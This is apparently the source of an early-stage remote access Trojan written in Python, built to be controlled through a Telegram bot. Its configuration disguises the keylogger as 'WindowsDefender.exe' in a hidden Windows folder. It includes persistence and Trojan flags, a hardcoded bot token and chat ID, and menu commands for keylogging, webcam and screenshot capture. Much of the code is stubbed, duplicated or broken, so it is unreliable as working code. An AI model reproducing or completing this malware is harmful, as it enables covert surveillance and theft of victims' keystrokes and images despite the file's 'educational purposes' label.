#██████╗░░█████╗░████████╗░░██████╗░██╗░░░██╗
#██╔══██╗██╔══██╗╚══██╔══╝░░██╔══██╗╚██╗░██╔╝
#██████╔╝███████║░░░██║░░░░░██████╔╝░╚████╔╝░
#██╔══██╗██╔══██║░░░██║░░░░░██╔═══╝░░░╚██╔╝░░
#██║░░██║██║░░██║░░░██║░░░░░██║░░░░░░░░██║░░░
#╚═╝░░╚═╝╚═╝░░╚═╝░░░╚═╝░░░░░╚═╝░░░░░░░░╚═╝░░░
#░██████╗██████╗░██╗░░░██╗░████████╗███████╗██╗░░░░░███████╗░██████╗░██████╗░░█████╗░███╗░░░███╗░░░░░░
#██╔════╝██╔══██╗╚██╗░██╔╝░╚══██╔══╝██╔════╝██║░░░░░██╔════╝██╔════╝░██╔══██╗██╔══██╗████╗░████║░░░░░░
#╚█████╗░██████╔╝░╚████╔╝░░░░░██║░░░█████╗░░██║░░░░░█████╗░░██║░░██╗░██████╔╝███████║██╔████╔██║░░░░░░
#░╚═══██╗██╔═══╝░░░╚██╔╝░░░░░░██║░░░██╔══╝░░██║░░░░░██╔══╝░░██║░░╚██╗██╔══██╗██╔══██║██║╚██╔╝██║░░░░░░
#██████╔╝██║░░░░░░░░██║░░░░░░░██║░░░███████╗███████╗███████╗╚██████╔╝██║░░██║██║░░██║██║░╚═╝░██║░░░░░░
#╚═════╝░╚═╝░░░░░░░░╚═╝░░░░░░░╚═╝░░░╚══════╝╚══════╝╚══════╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░v1.0░
import time                             # Pausar script por segundos predeterminados
from pydoc import html

import telepot                          # Api de Telegram
from telepot.loop import MessageLoop    # Api de Telegram


class Config:
    def __init__(self):
        self.NAME_KEY = "WindowsDefender" + ".exe"  # Nombre del Keylogger // Debe ser exactamente igual al Compilado *.exe
        self.NAME_REG = "Windows Defeder REG"  # Nombre del Keylogger en el registro
        self.LOG_KEY_PATH = "C:\\Users\\Public\\Security\\Settings" + "\\"  # Ruta del Registro de teclas
        self.LOG_NAME = "reg" + "." + "k"
        self.PATH_HIDDEN = "C:\\Users\\Public\\Security\\Windows Defender" + "\\"  # Ruta donde se esconderá el KEYLOGGER
        self.PATH_KEY = self.PATH_HIDDEN + self.NAME_KEY  # <No cambiar>
        self.PATH_LOG = self.LOG_KEY_PATH + self.LOG_NAME  # <No cambiar>
    class Developer:
        def __init__(self):
            self.STARUP = False
            self.TROJAN = False
            self.DELAY = 1
            self.CONSOLE_DEBUG = False
    class TelegramBot:
        def __init__(self):
            self.ID = 831756903  # ID Principal [Obligatorio]
            self.ID_2 = 000000000  # ID secundario [Opcional]
            self.ID_3 = 000000000  # ID Terciario  [Opcional]
            self.TOKEN = "1238108150:AAGdB66CsS_5fKpgVnOXvO8w9eSrT2V5n50"  # TOKEN de tu Bot [Obligatorio]
            # Personalize
            self.LEN_TEXT = 2  # 3600  #    [Longitud maxima por mensaje es de = 4000] # Solo se enviará el registro si sobrepasa la longitud especificada




def handle(msg):
    command = msg['text']           # Recibe el texto que el usuario mande al bot
    ID = Config.TelegramBot().ID    # ID personal
    cache = ""
    if command == "/about":
        about= ""\
        '\n<b>Developed by:</b> <code>SebastianEPH</code>' \
        '\n<b>Product Name: </b><a href="https://github.com/SebastianEPH/RATpySpyTelegramBot"> RATpySpyTelegramBot</a> C#' \
        '\n<b>Type Software:</b> <code>Remote Administration tool</code>' \
        '\n<b>Versión:</b> <code>1.0</code>' \
        '\n<b>State:</b> <code>Alfa</code>' \
        '\n<b>Architecture:</b> <code>x86 bits</code> || <code>x64 bits</code>' \
        '\n<b>Size:</b> <code>No disponible</code>' \
        '\n<b>Undetectable:</b> <code>Not tester</code>' \
        '\n<b>Plataform:</b> <code>Windows 7, 8.1 and 10</code>' \
        '\n<b>Programming Lenguage:</b> <code>Python 3.8</code>' \
        '\n<b>Licence:</b> <code>GNU Licence</code>' \
        '\n<b>IDE:</b> PyCharm <i>[Education license]</i>' \
        '\n<b>Description:</b>' \
        '\nRemote access Trojan, spies and obtains information from the infected pc, controlled by telegram commands.  \n<b>[Educational purposes]</b>' \
        '\n<b></b>' \
        '\n<b></b>' \
        '\n<b>Contact: </b>' \
        '\n<b> - <a href="https://github.com/SebastianEPH">GitHub</a> </b>' \
        '\n<b> - <a href="https://t.me/sebastianeph">Telegram</a> </b>' \
        '\n<b> - <a href="https://sebastianeph.github.io/">WebSite</a> </b>' \
        '\n<b> - SebastianEPH99@gmail.com</b>' \
        '\n<b></b>' \
        '\n<b>You can read the documentation at the following link >></b>' \
        '\n<b></b>'

        bot.sendMessage(TB.TelegramBot().ID, about, parse_mode='html')
        #bot.sendPhoto(ID,"https://i.imgur.com/SelWET0.png")
    elif command == "/screenshot":
        bot.sendMessage(ID, "Scrrenshot")
    elif command == "/screenshot":
        bot.sendMessage(ID, "Scrrenshot")
    elif command == "/screenshot":
        bot.sendMessage(ID, "Scrrenshot")
    elif command == "/screenshot":
        bot.sendMessage(ID, "Scrrenshot")
    elif command == "/screenshot":
        bot.sendMessage(ID, "Scrrenshot")
    elif command == "/screenshot":
        bot.sendMessage(ID, "Scrrenshot")
    elif command == "/screenshot":
        bot.sendMessage(ID, "Scrrenshot")
    elif command == "/screenshot":
        bot.sendMessage(ID, "Scrrenshot")
    elif command == "/screenshot":
        bot.sendMessage(ID, "Scrrenshot")
    else:
        FUNCTIONELITIES = "Write "\
        "red_info => Información de la Red\n" \
        "/webcam   => Toma foto a la WebCam\n" \
        "/webcam   => Toma foto a la WebCam\n" \
        "/webcam   => Toma foto a la WebCam\n" \
        "/webcam   => Toma foto a la WebCam\n" \
        "/keylogger_active     => Active Keylogger\n" \
        "/keylogger_disable   => Disable Keylogger\n" \
        "/keylogger_get          => Get keylog\n" \
        "/webcam   => Toma foto a la WebCam\n" \
        "/webcam   => Toma foto a la WebCam\n" \
        "/webcam   => Toma foto a la WebCam\n" \
        "/about"
        bot.sendMessage(ID, FUNCTIONELITIES)

# Starting Script
if __name__ == '__main__':
    print("[RAT] Start")

    # Instancia configuración
    TB = Config()

    # Instancia Bot con Token
    bot = telepot.Bot(TB.TelegramBot().TOKEN)
    bot.sendMessage(TB.TelegramBot().ID, "Usted está en linea ...")
    # Execute other thread what listening
    MessageLoop(bot, handle).run_as_thread()
    print('Listening ...')



    # Keep the program running.
    while True:
        time.sleep(10)


